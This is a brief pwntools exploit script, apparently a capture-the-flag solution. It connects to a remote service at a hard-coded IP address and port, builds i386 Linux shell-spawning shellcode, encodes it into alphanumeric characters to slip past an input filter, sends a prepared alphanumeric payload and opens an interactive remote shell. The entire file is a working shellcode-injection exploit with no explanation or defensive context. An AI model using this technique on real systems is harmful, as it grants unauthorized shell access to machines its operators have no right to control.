from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('155.69.144.206', 22805)
cmd = asm(shellcraft.sh())
# encoder.re_alphanumeric = r'[^A-Z0-9]'
encoded = pwnlib.encoders.encode(cmd, expr=r'[^A-Z0-9]')
print(cmd)
print(encoded)
test="IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQ8IJWM1NP4KBH6OD3U8EP58VO52CY2NLIKSXMK0AA"
r.send(test)
r.interactive()
